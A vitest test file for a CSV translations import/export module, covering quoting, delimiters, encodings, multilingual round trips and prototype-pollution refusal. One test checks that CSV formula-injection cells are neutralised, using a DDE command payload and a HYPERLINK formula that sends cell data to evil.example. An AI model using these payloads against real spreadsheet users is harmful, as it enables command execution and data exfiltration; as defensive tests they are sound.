import { describe, expect, it } from 'vitest';
import type { Project, Slide } from '../model/types';
import { csvToTexts, decodeCsvBytes, detectDelimiter, MAX_CSV_TEXT_LENGTH, parseCsv, textsToCsv } from './csv';
import { deepFreeze, device, layout, project, slide, text } from './fixtures.node';

const BOM = '\ufeff';

/** Two slides, three languages, keys spread over layouts and texts. */
function demo(): Project {
  const s1 = slide({
    id: 's1',
    layouts: { iphone: layout(text('h', 'headline'), text('s', 'subtitle'), device('d')), 'android-phone': layout(text('c', 'caption')) },
    texts: {
      'en-US': { headline: 'Plan *faster*', subtitle: 'Your week, at a glance', caption: 'New' },
      'ar-SA': { headline: 'خطّط *أسرع*', subtitle: 'أسبوعك في لمحة' },
      he: { headline: 'תכננו *מהר* יותר' },
    },
  });
  const s2 = slide({
    id: 's2',
    layouts: { iphone: layout(text('h', 'headline')) },
    texts: { 'en-US': { headline: 'Stay "in sync", always', badge: 'Pro' }, 'de-DE': { legal: 'Nur für Mitglieder' } },
  });
  return project({ languages: ['en-US', 'ar-SA', 'he'], families: ['iphone', 'android-phone'], slides: [s1, s2] });
}

/** The same project with every text removed. */
function blank(p: Project): Project {
  return { ...p, slides: p.slides.map((s): Slide => ({ ...s, texts: {} })) };
}

describe('textsToCsv', () => {
  it('writes a BOM, the header and one CRLF row per slide and key', () => {
    expect(textsToCsv(demo())).toBe(
      BOM +
        [
          'slide,key,en-US,ar-SA,he',
          '1,headline,Plan *faster*,خطّط *أسرع*,תכננו *מהר* יותר',
          '1,subtitle,"Your week, at a glance",أسبوعك في لمحة,',
          '1,caption,New,,',
          '2,headline,"Stay ""in sync"", always",,',
          '2,badge,Pro,,',
          '2,legal,,,',
        ].join('\r\n') +
        '\r\n',
    );
  });

  it('orders keys headline, subtitle, then alphabetically', () => {
    const s = slide({ texts: { 'en-US': { zeta: 'z', subtitle: 's', alpha: 'a', headline: 'h', Beta: 'b' } } });
    const rows = textsToCsv(project({ slides: [s] })).split('\r\n').slice(1, -1);
    expect(rows.map((r) => r.split(',')[1])).toEqual(['headline', 'subtitle', 'Beta', 'alpha', 'zeta']);
  });

  it('quotes delimiters, quotes, newlines and outer spaces (RFC 4180)', () => {
    const values = ['a,b', 'semi;colon', 'tab\there', 'say "hi"', 'line1\nline2', 'cr\r\nlf', ' lead', 'trail ', 'plain'];
    const s = slide({ texts: { 'en-US': Object.fromEntries(values.map((v, i) => [`k${i}`, v])) } });
    const csv = textsToCsv(project({ slides: [s] }));
    expect(csv).toContain('1,k0,"a,b"\r\n');
    expect(csv).toContain('1,k1,"semi;colon"\r\n');
    expect(csv).toContain('1,k2,"tab\there"\r\n');
    expect(csv).toContain('1,k3,"say ""hi"""\r\n');
    expect(csv).toContain('1,k4,"line1\nline2"\r\n');
    expect(csv).toContain('1,k6," lead"\r\n');
    expect(csv).toContain('1,k7,"trail "\r\n');
    expect(csv).toContain('1,k8,plain\r\n');
  });

  it('handles projects without slides or languages', () => {
    expect(textsToCsv(project({ slides: [] }))).toBe(`${BOM}slide,key,en-US\r\n`);
    expect(textsToCsv(project({ languages: [], slides: [slide({ texts: { 'en-US': { headline: 'x' } } })] }))).toBe(`${BOM}slide,key\r\n1,headline\r\n`);
  });

  it('exports only keys the model accepts and never reads inherited properties', () => {
    const s = slide({ layouts: { iphone: layout(text('t', 'constructor'), text('u', 'toString'), text('v', ''), text('w', 'caption')) } });
    expect(textsToCsv(project({ slides: [s] }))).toBe(`${BOM}slide,key,en-US\r\n1,caption,\r\n`);
    const parsed = slide({ texts: JSON.parse('{"en-US":{"__proto__":"x","headline":"h"}}') as Slide['texts'] });
    expect(textsToCsv(project({ slides: [parsed] }))).toBe(`${BOM}slide,key,en-US\r\n1,headline,h\r\n`);
  });

  it('neutralises cells a spreadsheet would run as a formula', () => {
    const values = ["=cmd|' /C calc'!A0", '=HYPERLINK("https://evil.example/?d="&A1,"Click")', '+1 more', '-20%', '@user', '\tindent', "'=already", 'Total = 5', 'safe'];
    const s = slide({ texts: { 'en-US': Object.fromEntries(values.map((v, i) => [`k${i}`, v])) } });
    const csv = textsToCsv(project({ slides: [s] }));
    const cells = parseCsv(csv.slice(1)).slice(1).map((r) => r[2]);
    expect(cells).toEqual(["'=cmd|' /C calc'!A0", '\'=HYPERLINK("https://evil.example/?d="&A1,"Click")', "'+1 more", "'-20%", "'@user", "'\tindent", "''=already", 'Total = 5', 'safe']);
    for (const cell of cells) expect(cell, cell).not.toMatch(/^[=+\-@\t\r]/);
    expect(csv).toContain("1,k0,'=cmd|' /C calc'!A0\r\n");
    // Keys may start with "-" too.
    expect(textsToCsv(project({ slides: [slide({ texts: { 'en-US': { '-note': 'x' } } })] }))).toContain("1,'-note,x\r\n");
  });
});

describe('csvToTexts round trips', () => {
  it('restores every text of a project, including Arabic, Hebrew and emoji', () => {
    const p = demo();
    const result = csvToTexts(blank(p), textsToCsv(p));
    for (const lang of p.languages) {
      p.slides.forEach((s, i) => expect(result.project.slides[i].texts[lang] ?? {}, `${lang} slide ${i + 1}`).toEqual(s.texts[lang] ?? {}));
    }
    expect(result.addedLanguages).toEqual([]);
    expect(result.skippedRows).toBe(0);
    // 5 English + 2 Arabic + 1 Hebrew texts; the German one is not a project language.
    expect(result.updatedCells).toBe(8);
  });

  it('keeps tricky strings byte for byte through UTF-8 bytes', () => {
    const tricky = [
      'مرحبا بالعالم',
      '\u200fשלום\u200e עולם',
      'تطبيق «واجهة» الجديد، ١٢٣',
      '👩\u200d💻 Code 🇸🇦🇮🇱 ✨',
      'emoji ‼️ with *highlight* and \\* escaped',
      '"Quoted", with comma; semicolon\tand tab',
      'line one\nline two\n\nline four',
      '  padded  ',
      '日本語のテキスト',
      'فارسی\u200cنویسی',
      '=SUM(A1:A2)',
      '+966 55 123 4567',
      '-50% today',
      '@wajha',
      '\tTabbed',
      "'=quoted formula",
      "''+two",
      "'plain apostrophe",
    ];
    const s = slide({ texts: { 'ar-SA': Object.fromEntries(tricky.map((t, i) => [`k${i}`, t])) } });
    const p = project({ languages: ['ar-SA'], slides: [s] });
    const bytes = new TextEncoder().encode(textsToCsv(p));
    expect([...bytes.subarray(0, 3)]).toEqual([0xef, 0xbb, 0xbf]);
    const back = csvToTexts(blank(p), decodeCsvBytes(bytes));
    expect(back.project.slides[0].texts['ar-SA']).toEqual(s.texts['ar-SA']);
    expect(back.updatedCells).toBe(tricky.length);
  });

  it('reports no changes when importing an unchanged export', () => {
    const p = demo();
    const result = csvToTexts(p, textsToCsv(p));
    expect(result.updatedCells).toBe(0);
    expect(result.project).toEqual(p);
  });
});

describe('csvToTexts parsing tolerance', () => {
  const base = () => project({ languages: ['en-US', 'ar-SA'], slides: [slide({ id: 'a' }), slide({ id: 'b' })] });

  it('reads Excel-style semicolon files', () => {
    const csv = 'slide;key;en-US;ar-SA\r\n1;headline;Hello, world;مرحبا\r\n2;subtitle;"a;b";\r\n';
    const { project: out, updatedCells } = csvToTexts(base(), csv);
    expect(out.slides[0].texts).toEqual({ 'en-US': { headline: 'Hello, world' }, 'ar-SA': { headline: 'مرحبا' } });
    expect(out.slides[1].texts).toEqual({ 'en-US': { subtitle: 'a;b' } });
    expect(updatedCells).toBe(3);
  });

  it('honours an Excel "sep=" line, after a BOM too', () => {
    const csv = `${BOM}sep=;\r\nslide;key;en-US\r\n1;headline;"x, y"\r\n`;
    expect(csvToTexts(base(), csv).project.slides[0].texts['en-US']).toEqual({ headline: 'x, y' });
    const pipes = 'SEP=|\nslide|key|en-US\n1|headline|piped\n';
    expect(csvToTexts(base(), pipes).project.slides[0].texts['en-US']).toEqual({ headline: 'piped' });
  });

  it('reads tab-separated text (Excel "Unicode Text")', () => {
    const tsv = 'slide\tkey\ten-US\tar-SA\n1\theadline\tTabbed, with comma\tمرحبا\n';
    const bytes = new Uint8Array([0xff, 0xfe, ...new Uint8Array(new Uint16Array([...tsv].map((c) => c.charCodeAt(0))).buffer)]);
    const out = csvToTexts(base(), decodeCsvBytes(bytes)).project;
    expect(out.slides[0].texts).toEqual({ 'en-US': { headline: 'Tabbed, with comma' }, 'ar-SA': { headline: 'مرحبا' } });
  });

  it('accepts LF, CRLF and CR line ends and quoted newlines', () => {
    for (const eol of ['\n', '\r\n', '\r']) {
      const csv = ['slide,key,en-US', '1,headline,"two\r\nlines"', '2,headline,"three\nmore\rlines"', ''].join(eol);
      const out = csvToTexts(base(), csv).project;
      expect(out.slides[0].texts['en-US'].headline, JSON.stringify(eol)).toBe('two\nlines');
      expect(out.slides[1].texts['en-US'].headline, JSON.stringify(eol)).toBe('three\nmore\nlines');
    }
  });

  it('matches rows by slide number and key, in any order, with reordered columns', () => {
    const csv = 'ar-SA,key,en-US,slide\nثاني,headline,Second,2\nأول,headline,First,1\n';
    const out = csvToTexts(base(), csv).project;
    expect(out.slides[0].texts).toEqual({ 'ar-SA': { headline: 'أول' }, 'en-US': { headline: 'First' } });
    expect(out.slides[1].texts).toEqual({ 'ar-SA': { headline: 'ثاني' }, 'en-US': { headline: 'Second' } });
  });

  it('skips rows for unknown slides or without a key, and ignores blank lines', () => {
    const csv = ['slide,key,en-US', '0,headline,zero', '3,headline,three', 'x,headline,nan', ',headline,empty', '-1,headline,neg', '1.5,headline,frac', '1,,no key', '', ' , , ', '1,headline,ok', '01,subtitle,padded', ' 2.0 ,headline,spreadsheet'].join('\n');
    const result = csvToTexts(base(), csv);
    expect(result.skippedRows).toBe(7);
    expect(result.project.slides[0].texts['en-US']).toEqual({ headline: 'ok', subtitle: 'padded' });
    expect(result.project.slides[1].texts['en-US']).toEqual({ headline: 'spreadsheet' });
  });

  it('leaves texts unchanged for empty or whitespace-only cells and short rows', () => {
    const p = project({ languages: ['en-US', 'ar-SA'], slides: [slide({ texts: { 'en-US': { headline: 'Keep me' }, 'ar-SA': { headline: 'ابقني' } } })] });
    const csv = 'slide,key,en-US,ar-SA\n1,headline,,   \n1,headline\n1,subtitle,New,\n';
    const result = csvToTexts(p, csv);
    expect(result.project.slides[0].texts).toEqual({ 'en-US': { headline: 'Keep me', subtitle: 'New' }, 'ar-SA': { headline: 'ابقني' } });
    expect(result.updatedCells).toBe(1);
  });

  it('applies repeated rows in order and counts only real changes', () => {
    const p = project({ slides: [slide({ texts: { 'en-US': { headline: 'Same' } } })] });
    const csv = 'slide,key,en-US\n1,headline,Same\n1,headline,Other\n1,headline,Other\n';
    const result = csvToTexts(p, csv);
    expect(result.project.slides[0].texts['en-US'].headline).toBe('Other');
    expect(result.updatedCells).toBe(1);
  });

  it('ignores extra cells and keeps outer spaces inside cells', () => {
    const csv = 'slide,key,en-US\n1,headline, spaced ,extra,cells\n1, subtitle ,"  quoted  "  \n';
    const texts = csvToTexts(base(), csv).project.slides[0].texts['en-US'];
    expect(texts).toEqual({ headline: ' spaced ', subtitle: '  quoted  ' });
  });

  it('cuts texts at the project text limit without splitting a character', () => {
    const long = `${'a'.repeat(MAX_CSV_TEXT_LENGTH - 1)}😀tail`;
    const texts = csvToTexts(base(), `slide,key,en-US\n1,headline,${long}\n`).project.slides[0].texts['en-US'];
    expect(texts.headline).toBe('a'.repeat(MAX_CSV_TEXT_LENGTH - 1));
    const exact = 'b'.repeat(MAX_CSV_TEXT_LENGTH);
    expect(csvToTexts(base(), `slide,key,en-US\n1,headline,${exact}\n`).project.slides[0].texts['en-US'].headline).toBe(exact);
  });

  it('refuses __proto__ and every other inherited member name as a key', () => {
    const csv = 'slide,key,en-US\n1,__proto__,polluted\n1,constructor,x\n1,toString,y\n1,headline,ok\n';
    const result = csvToTexts(base(), csv);
    expect(result.skippedRows).toBe(3);
    expect(result.updatedCells).toBe(1);
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
    const texts = result.project.slides[0].texts['en-US'];
    expect(Object.getPrototypeOf(texts)).toBe(Object.prototype);
    expect(Object.keys(texts)).toEqual(['headline']);
  });

  it('skips rows whose key the project cannot store instead of counting them', () => {
    const csv = ['slide,key,en-US', '1,my key,Hello', '1,عنوان,مرحبا', `1,${'k'.repeat(41)},long`, '1,headline,Hi', '1,promo.2,Sale'].join('\n');
    const result = csvToTexts(base(), csv);
    expect(result.skippedRows).toBe(3);
    expect(result.updatedCells).toBe(2);
    expect(result.project.slides[0].texts['en-US']).toEqual({ headline: 'Hi', 'promo.2': 'Sale' });
  });

  it('strips the formula neutralisation from keys and texts', () => {
    const csv = "slide,key,en-US\n1,headline,'=SUM(A1)\n1,'-note,'+1\n1,subtitle,'just an apostrophe\n";
    const texts = csvToTexts(base(), csv).project.slides[0].texts['en-US'];
    expect(texts).toEqual({ headline: '=SUM(A1)', '-note': '+1', subtitle: "'just an apostrophe" });
    // A spreadsheet that drops the apostrophe on save gives the original text too.
    expect(csvToTexts(base(), 'slide,key,en-US\n1,headline,=SUM(A1)\n').project.slides[0].texts['en-US']).toEqual({ headline: '=SUM(A1)' });
  });

  it('throws on files without slide and key columns', () => {
    expect(() => csvToTexts(base(), '')).toThrow(/slide.*key/);
    expect(() => csvToTexts(base(), 'name,value\nx,y\n')).toThrow(/not a translations CSV/);
    expect(() => csvToTexts(base(), `${BOM}\n\n`)).toThrow(/not a translations CSV/);
  });

  it('finds the header after leading blank lines and matches header names case-insensitively', () => {
    const csv = '\r\n\r\n"Slide";"KEY";"EN-us"\r\n1;headline;Found\r\n';
    expect(csvToTexts(base(), csv).project.slides[0].texts['en-US']).toEqual({ headline: 'Found' });
  });
});

describe('csvToTexts languages', () => {
  const base = () => project({ languages: ['en-US'], slides: [slide()] });

  it('adds catalog languages from the header, in header order', () => {
    const csv = 'slide,key,en-US,de_de,XX-yy,he,ar-sa\n1,headline,Hi,Hallo,???,שלום,مرحبا\n';
    const result = csvToTexts(base(), csv);
    expect(result.addedLanguages).toEqual(['de-DE', 'he', 'ar-SA']);
    expect(result.project.languages).toEqual(['en-US', 'de-DE', 'he', 'ar-SA']);
    expect(result.project.slides[0].texts).toEqual({ 'en-US': { headline: 'Hi' }, 'de-DE': { headline: 'Hallo' }, he: { headline: 'שלום' }, 'ar-SA': { headline: 'مرحبا' } });
  });

  it('adds a declared language even when its column is still empty', () => {
    const result = csvToTexts(base(), 'slide,key,en-US,fr-FR\n1,headline,Hi,\n');
    expect(result.addedLanguages).toEqual(['fr-FR']);
    expect(result.project.languages).toEqual(['en-US', 'fr-FR']);
    expect(result.project.slides[0].texts['fr-FR']).toBeUndefined();
  });

  it('matches project languages that are not in the catalog', () => {
    const p = project({ languages: ['en-US', 'x-klingon'], slides: [slide()] });
    const result = csvToTexts(p, 'slide,key,X-KLINGON\n1,headline,nuqneH\n');
    expect(result.project.slides[0].texts['x-klingon']).toEqual({ headline: 'nuqneH' });
    expect(result.addedLanguages).toEqual([]);
  });

  it('uses only the first column of a repeated language', () => {
    const result = csvToTexts(base(), 'slide,key,en-US,EN-US\n1,headline,first,second\n');
    expect(result.project.slides[0].texts['en-US'].headline).toBe('first');
  });
});

describe('csvToTexts immutability', () => {
  it('never mutates the input project', () => {
    const p = deepFreeze(demo());
    const before = JSON.stringify(p);
    const result = csvToTexts(p, 'slide,key,en-US,de-DE\n1,headline,Changed,Neu\n2,subtitle,Added,\n');
    expect(JSON.stringify(p)).toBe(before);
    expect(result.project).not.toBe(p);
    expect(result.project.slides[0].texts['en-US'].headline).toBe('Changed');
    // Untouched branches are shared, not copied.
    expect(result.project.theme).toBe(p.theme);
    expect(result.project.slides[0].layouts).toBe(p.slides[0].layouts);
  });

  it('returns the same project object when nothing changed', () => {
    const p = demo();
    expect(csvToTexts(p, 'slide,key,en-US\n').project).toBe(p);
  });

  it('does not freeze the caller project', () => {
    const p = demo();
    csvToTexts(p, 'slide,key,en-US\n1,headline,New\n');
    expect(Object.isFrozen(p.slides[1])).toBe(false);
    expect(Object.isFrozen(p.theme)).toBe(false);
  });
});

describe('parseCsv', () => {
  it('splits records and fields', () => {
    expect(parseCsv('')).toEqual([]);
    expect(parseCsv('a')).toEqual([['a']]);
    expect(parseCsv('a,b\nc,d\n')).toEqual([['a', 'b'], ['c', 'd']]);
    expect(parseCsv('a,b,\n,\n')).toEqual([['a', 'b', ''], ['', '']]);
    expect(parseCsv('\n')).toEqual([['']]);
    expect(parseCsv('""')).toEqual([['']]);
  });

  it('handles quotes per RFC 4180 plus common leniencies', () => {
    expect(parseCsv('"a ""b"" c","x,y"')).toEqual([['a "b" c', 'x,y']]);
    expect(parseCsv('"multi\nline",z')).toEqual([['multi\nline', 'z']]);
    expect(parseCsv('a"b,c')).toEqual([['a"b', 'c']]);
    expect(parseCsv('  "padded"  ,x')).toEqual([['padded', 'x']]);
    expect(parseCsv('"unterminated,still\nhere')).toEqual([['unterminated,still\nhere']]);
    expect(parseCsv('"closed"tail')).toEqual([['closedtail']]);
  });

  it('uses the given delimiter', () => {
    expect(parseCsv('a;b,c\n', ';')).toEqual([['a', 'b,c']]);
    expect(parseCsv('a\tb c\n', '\t')).toEqual([['a', 'b c']]);
  });
});

describe('detectDelimiter', () => {
  it('picks the most frequent delimiter of the header line', () => {
    expect(detectDelimiter('slide,key,en-US')).toBe(',');
    expect(detectDelimiter('slide;key;en-US\n1,2,3,4,5,6')).toBe(';');
    expect(detectDelimiter('slide\tkey\ten-US')).toBe('\t');
    expect(detectDelimiter('"a,b";"c,d";e')).toBe(';');
    expect(detectDelimiter('\n\nslide;key')).toBe(';');
    expect(detectDelimiter('nothing')).toBe(',');
    expect(detectDelimiter('a,b;c')).toBe(',');
  });
});

describe('decodeCsvBytes', () => {
  it('decodes UTF-8 with or without BOM, UTF-16 with BOM, and Windows-1252 as a last resort', () => {
    const utf8 = new TextEncoder().encode('slide,key,ar-SA\n1,headline,مرحبا');
    expect(decodeCsvBytes(utf8)).toBe('slide,key,ar-SA\n1,headline,مرحبا');
    expect(decodeCsvBytes(new Uint8Array([0xef, 0xbb, 0xbf, ...utf8]))).toBe('slide,key,ar-SA\n1,headline,مرحبا');
    const be = new Uint8Array([0xfe, 0xff, 0x00, 0x41, 0x05, 0xd0]);
    expect(decodeCsvBytes(be)).toBe('Aא');
    const le = new Uint8Array([0xff, 0xfe, 0x41, 0x00, 0xd0, 0x05]);
    expect(decodeCsvBytes(le)).toBe('Aא');
    // "Café €5" saved by an old Excel as Windows-1252.
    expect(decodeCsvBytes(new Uint8Array([0x43, 0x61, 0x66, 0xe9, 0x20, 0x80, 0x35]))).toBe('Café €5');
    expect(decodeCsvBytes(new Uint8Array(0))).toBe('');
  });

  it('decodes legacy Arabic and Hebrew code pages when asked to', () => {
    const arabic = new Uint8Array([0xc7, 0xe1, 0xda, 0xd1, 0xc8, 0xed, 0xc9]);
    expect(decodeCsvBytes(arabic, 'windows-1256')).toBe('العربية');
    const hebrew = new Uint8Array([0xf9, 0xec, 0xe5, 0xed]);
    expect(decodeCsvBytes(hebrew, 'windows-1255')).toBe('שלום');
    // Valid UTF-8 always wins over the legacy guess.
    expect(decodeCsvBytes(new TextEncoder().encode('مرحبا'), 'windows-1256')).toBe('مرحبا');
    // An unknown label degrades to lenient UTF-8 instead of throwing.
    expect(decodeCsvBytes(new Uint8Array([0x41, 0xff]), 'no-such-encoding')).toBe('A�');
  });
});
